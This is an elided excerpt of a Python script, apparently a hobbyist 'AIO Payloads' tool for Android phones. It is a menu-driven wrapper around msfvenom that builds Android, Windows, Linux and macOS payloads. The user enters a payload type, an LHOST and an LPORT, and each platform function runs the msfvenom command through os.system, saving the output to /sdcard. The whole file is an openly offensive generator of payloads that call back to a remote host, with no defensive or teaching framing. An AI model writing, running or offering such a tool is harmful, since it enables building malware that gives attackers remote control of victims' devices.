...
# Cooded By : Saumya Agrawal
# Youtube   : https://youtube.com/saumyaagrawal
# Instagram : https://instagram.com/saumyaagrawal2001


import os
import time
import AIO_Payloads as back
...
def output_pld (output):
	if os.path.exists ("/sdcard/AIO_Payloads/"+output) == True:
		back.finaly ()
		print (cyan+"\n\nYour Payload Has generated successfull.\nIt has saved in Your \033[1;31m Internal Storage\n\033[1;36min \033[1;31m  AIO_Payloads "+cyan+"  Folder"+cyan+" with the name \n\033[1;31m"+output)
		...
		back_opt = int (input ("\n\n\033[1;34mAIO \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mPayloads\033[1;31m/~  \033[1;36m"))
		if back_opt == 2:
			back.exite ()
		else:
			back.main ()
...
\033[1;34mAIO \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mPayloads\033[1;31m/~  \033[1;36m"""))
	...
	if android_pld < 4:
		...
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/AIO_Payloads/"+output
	...
	if android_pld > 4:
		try:
			...
			print ("\033[1;34mAIO \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mPayloads\033[1;31m/~"+cyan+"  Plz Retry and Enter number from given options."+norml)
			Android ()
...
\033[1;34mAIO \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mPayloads\033[1;31m/~  \033[1;36m"""))
	...
	if windows_pld < 4:
		...
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f exe -o /sdcard/AIO_Payloads/"+output
		print (cyan+"Creating Payload...\n")
		os.system (pld)
		output_pld (output)
	...
	if windows_pld > 4:
		try:
			...
			print ("\033[1;34mAIO \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mPayloads\033[1;31m/~"+cyan+"  Plz Retry Enter number from given options."+norml)
			time.sleep(3)
			Windows ()
...
\033[1;34mAIO \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mPayloads\033[1;31m/~  \033[1;36m"""))
	...
	if linux_pld < 4:
		...
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f elf -o /sdcard/AIO_Payloads/"+output
		print (cyan+"Creating Payload...\n")
		os.system (pld)
		output_pld (output)
...
def Mac ():
	...
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f macho -o /sdcard/AIO_Payloads/"+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	output_pld (output)
...
if __name__ == "__main__":
	try:
		...
		print ("\n\n\033[1;34mAIO \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mPayloads\033[1;31m/~"+cyan+"  By By"+norml)
	except ValueError:
		print ("\n\n\033[1;34mAIO \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mPayloads\033[1;31m/~"+cyan+"  Plz Retry and Enter number from given options."+norml)
	except TypeError:
		print(" Wrong input")
